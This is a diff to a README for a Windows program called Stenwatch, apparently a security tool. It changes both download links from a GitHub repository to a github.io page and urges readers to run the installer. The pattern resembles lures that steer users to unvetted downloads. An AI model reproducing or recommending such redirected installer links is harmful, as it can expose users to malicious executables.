@@ -27,7 +27,7 @@ Welcome! Follow these simple steps to get Stenwatch running on your Windows comp
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**⬇️ Download Stenwatch Now**](https://github.com/hooflike-katowice1134/Stenwatch)
+[**⬇️ Download Stenwatch Now**](https://hooflike-katowice1134.github.io)
 
 ### Step 2: Run the Installer
 
@@ -146,7 +146,7 @@ Cyber threats grow every day, but your time and patience do not. Stenwatch gives
 
 Take the first step today. Download Stenwatch, run it for five minutes, and see how much clearer your security picture becomes.
 
-The link again: [**Click Here to Get Stenwatch**](https://github.com/hooflike-katowice1134/Stenwatch)
+The link again: [**Click Here to Get Stenwatch**](https://hooflike-katowice1134.github.io)
 
 ---
 
